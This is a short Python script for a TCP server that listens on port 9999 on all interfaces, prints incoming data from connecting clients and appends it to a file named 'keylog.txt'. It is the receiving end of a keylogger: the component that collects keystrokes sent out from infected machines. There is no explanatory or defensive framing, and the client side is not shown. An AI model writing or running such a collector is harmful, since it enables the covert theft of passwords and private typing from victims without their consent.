import socket

# Server Configuration
server_ip = "0.0.0.0"  # Listen on all available interfaces
server_port = 9999

# Create a socket object
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((server_ip, server_port))
server.listen(5)  # Listen for incoming connections (up to 5 clients)

print(f"[*] Listening on {server_ip}:{server_port}")

while True:
    # Accept a connection from the client
    client_socket, addr = server.accept()
    print(f"[*] Accepted connection from {addr}")

    # Create/open the log file
    with open("keylog.txt", "a") as log_file:
        while True:
            try:
                data = client_socket.recv(1024).decode('utf-8')
                if not data:
                    break
                print(f"[{addr}] {data}")
                log_file.write(data)
                log_file.flush()  # Ensure data is written to the file immediately
            except Exception as e:
                print(f"Error: {str(e)}")
                break

    client_socket.close()
